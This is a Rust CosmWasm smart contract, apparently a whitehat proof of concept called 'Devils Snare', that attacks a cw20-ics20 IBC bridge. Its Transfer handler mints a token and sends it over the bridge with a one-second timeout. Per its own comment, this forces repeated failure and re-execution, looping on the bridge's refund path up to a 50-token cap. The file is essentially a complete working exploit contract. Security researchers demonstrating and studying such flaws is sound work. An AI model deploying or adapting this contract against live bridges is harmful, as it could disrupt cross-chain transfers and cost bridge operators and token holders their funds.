

#[cfg(not(feature = "library"))]
use cosmwasm_std::entry_point;
use cosmwasm_std::{
    to_binary, Binary, Deps, DepsMut, Env, MessageInfo, Reply, Response, StdResult, Uint128,
};
use cw2::set_contract_version;

use crate::msg::MigrateMsg;
use crate::state::{BRIDGE_CONTRACT, CHANNEL_ID, RECEIVER};
use crate::{error::ContractError, msg::InstantiateMsg};
use cw20_base::{
    contract::{execute as cw20_execute, instantiate as cw20_instantiate, query as cw20_query},
    msg::ExecuteMsg as Cw20ExecuteMsg,
    msg::InstantiateMsg as Cw20InstantiateMsg,
};

// version info for migration info
const CONTRACT_NAME: &str = "crates.io:ics20-devils-snare";
const CONTRACT_VERSION: &str = env!("CARGO_PKG_VERSION");

/// Handling contract instantiation
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn instantiate(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    msg: InstantiateMsg,
) -> Result<Response, cw20_base::ContractError> {
    CHANNEL_ID.save(deps.storage, &msg.channel_id)?;
    BRIDGE_CONTRACT.save(deps.storage, &msg.bridge_contract)?;
    RECEIVER.save(deps.storage, &msg.receiver)?;

    // set contract version
    set_contract_version(deps.storage, CONTRACT_NAME, CONTRACT_VERSION)?;
    // instantiate cw20 base contract
    cw20_instantiate(
        deps,
        env,
        info,
        Cw20InstantiateMsg {
            name: "Devils Snare Whitehat Demo".to_string(),
            symbol: "DSNARE".to_string(),
            decimals: 0,
            initial_balances: vec![],
            mint: None,
            marketing: None,
        },
    )
}

/// Handling contract migration
/// To make a contract migratable, you need
/// - this entry_point implemented
/// - only contract admin can migrate, so admin has to be set at contract initiation time
/// Handling contract execution
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn migrate(_deps: DepsMut, _env: Env, msg: MigrateMsg) -> Result<Response, ContractError> {
    match msg {
        // Find matched incoming message variant and execute them with your custom logic.
        //
        // With `Response` type, it is possible to dispatch message to invoke external logic.
        // See: https://github.com/CosmWasm/cosmwasm/blob/main/SEMANTICS.md#dispatching-messages
    }
}

/// Handling contract execution
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn execute(
    deps: DepsMut,
    env: Env,
    info: MessageInfo,
    msg: Cw20ExecuteMsg,
) -> Result<Response, cw20_base::ContractError> {
    match msg {
        Cw20ExecuteMsg::Transfer { .. } => {
            // load supply
            let mut token_info = cw20_base::state::TOKEN_INFO.load(deps.storage)?;
            let limit = Uint128::from(50_u128);
            if token_info.total_supply > limit {
                // gracefully exit if supply limit is exceeded
                return Ok(Response::new()
                    .add_attribute("contract", "ics20_devils_snare")
                    .add_attribute("action", "transfer")
                    .add_attribute("proxy_action", "ibc_mint_and_transfer")
                    .add_attribute("error", "supply_limit_exceeded"));
            }
            token_info.total_supply += Uint128::one();
            cw20_base::state::TOKEN_INFO.save(deps.storage, &token_info)?;

            let channel = CHANNEL_ID.load(deps.storage)?;
            let bridge_contract = BRIDGE_CONTRACT.load(deps.storage)?;
            let remote_address = RECEIVER.load(deps.storage)?;

            let msg = cw20::Cw20ReceiveMsg {
                sender: info.sender.into(),
                amount: Uint128::one(),
                msg: to_binary(&cw20_ics20::msg::TransferMsg {
                    channel,
                    remote_address,
                    // extemely short timeout of one second ensures that the transfer will fail
                    // and this function will be run again when it does
                    timeout: Some(1_u64),
                })?,
            }
            .into_cosmos_msg(bridge_contract)?;

            Ok(Response::new()
                .add_message(msg)
                .add_attribute("contract", "ics20_devils_snare")
                .add_attribute("action", "transfer")
                .add_attribute("proxy_action", "ibc_mint_and_transfer"))
        }
        _ => cw20_execute(deps, env, info, msg),
    }
}

/// Handling contract query
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn query(deps: Deps, env: Env, msg: cw20_base::msg::QueryMsg) -> StdResult<Binary> {
    cw20_query(deps, env, msg)
}

/// Handling submessage reply.
/// For more info on submessage and reply, see https://github.com/CosmWasm/cosmwasm/blob/main/SEMANTICS.md#submessages
#[cfg_attr(not(feature = "library"), entry_point)]
pub fn reply(_deps: DepsMut, _env: Env, _msg: Reply) -> Result<Response, ContractError> {
    // With `Response` type, it is still possible to dispatch message to invoke external logic.
    // See: https://github.com/CosmWasm/cosmwasm/blob/main/SEMANTICS.md#dispatching-messages

    Ok(Response::default())
}
